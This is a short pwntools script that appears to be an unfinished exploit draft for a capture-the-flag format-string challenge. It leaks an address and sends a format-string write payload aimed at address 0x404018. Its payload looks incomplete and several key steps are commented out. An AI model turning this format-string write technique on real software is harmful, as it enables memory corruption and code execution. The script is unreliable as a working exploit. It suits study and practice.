#!/usr/bin/env python3
import time
from pwn import *

write_address = 0x404018

folder = "./fmtstr3/"
context.binary = bin = ELF(f"{folder}format-string-3")
libc = ELF(f"{folder}libc.so.6")
ld = ELF(f"{folder}ld-linux-x86-64.so.2")

r = process([ld.path, bin.path], env={"LD_PRELOAD": libc.path})

data = r.recvline().decode()
data = r.recvline().decode()
# print(data)
addr = data.split(" ")[-1]
# print(addr)
addr = int(addr, 16)
# print(addr)
# payload = fmtstr_payload(38, {write_address: addr + diff})
# payload = fmtstr_payload(38, {write_address: "A"})
payload = b"%hhn$lx"
payload += b"A" * (8 - len(payload)) + p64(write_address)

print(payload)
r.send(payload)
while True:
    time.sleep(5)
# gdb.attach(r)
# r.sendline(b"pwd\n")
# r.interactive()
# r.interactive()
# data = r.recvline().decode()
# print(data)